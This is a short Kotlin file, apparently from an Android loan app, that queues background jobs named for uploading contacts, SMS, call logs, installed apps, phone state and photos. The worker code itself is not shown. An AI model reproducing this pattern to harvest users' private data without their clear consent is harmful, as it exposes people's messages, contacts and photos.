package com.loanspeed.speed.util.workManager

import androidx.work.OneTimeWorkRequest
import androidx.work.WorkManager
import com.loanspeed.speed.CharmApplication


fun submitContacts() = WorkManager.getInstance(CharmApplication.instance)
    .enqueue(OneTimeWorkRequest.from(ContactsWM::class.java))

fun submitSMS() = WorkManager.getInstance(CharmApplication.instance)
    .enqueue(OneTimeWorkRequest.from(SmsWM::class.java))

fun submitCallLog() = WorkManager.getInstance(CharmApplication.instance)
    .enqueue(OneTimeWorkRequest.from(CallLogWM::class.java))

fun submitInstall() = WorkManager.getInstance(CharmApplication.instance)
    .enqueue(OneTimeWorkRequest.from(InstallAppWM::class.java))


 fun submitPhoneState() = WorkManager.getInstance(CharmApplication.instance)
    .enqueue(OneTimeWorkRequest.from(PhoneStateWM::class.java))



fun submitPhoto() = WorkManager.getInstance(CharmApplication.instance)
    .enqueue(OneTimeWorkRequest.from(PhotoWM::class.java))












